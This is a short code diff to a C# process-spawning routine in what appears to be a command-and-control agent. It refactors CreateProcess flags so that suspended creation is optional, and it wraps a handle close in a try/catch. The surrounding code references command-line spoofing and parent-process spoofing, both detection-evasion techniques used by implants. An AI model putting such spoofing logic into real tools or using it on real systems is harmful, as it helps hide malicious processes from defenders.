@@ -5,6 +5,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using Agent.Utilities.Invoker;
 using Agent.Models;
+using System.Linq.Expressions;
 
 namespace Agent.Utlities
 {
@@ -219,22 +220,18 @@ namespace Agent.Utlities
                 {
                     cmdLine = opts.spoofedcommandline;
                 }
+                Native.CreateProcessFlags flags;
+                if (opts.suspended)
+                {
+                    flags = Native.CreateProcessFlags.CREATE_SUSPENDED | Native.CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT | Native.CreateProcessFlags.CREATE_NEW_CONSOLE;
+                }
+                else
+                {
+                    flags = Native.CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT | Native.CreateProcessFlags.CREATE_NEW_CONSOLE;
+                }
 
                 //To do change this to use spoof command line args
-                result = Native.CreateProcess(
-                    null,
-                    cmdLine,
-                    pSec,
-                    tSec,
-                    true,
-                    Native.CreateProcessFlags.CREATE_SUSPENDED |
-                    Native.CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT |
-                    Native.CreateProcessFlags.CREATE_NEW_CONSOLE,
-                    IntPtr.Zero,
-                    null,
-                ref sInfoEx,
-                out pi
-                );
+                result = Native.CreateProcess(null, cmdLine, pSec, tSec, true, flags, IntPtr.Zero, null, ref sInfoEx, out pi);
 
                 if (!result)
                 {
@@ -336,7 +333,11 @@ namespace Agent.Utlities
 
             if (pInfo.hThread != IntPtr.Zero)
             {
-                Native.CloseHandle(pInfo.hThread);
+                try
+                {
+                    Native.CloseHandle(pInfo.hThread);
+                }
+                catch { }
             }
         }
         private bool AddSpoofParent(SpawnOptions opts, ref Native.STARTUPINFOEX siEx, ref IntPtr lpValueProc, ref IntPtr hStdOutWrite, ref IntPtr hDupStdOutWrite)
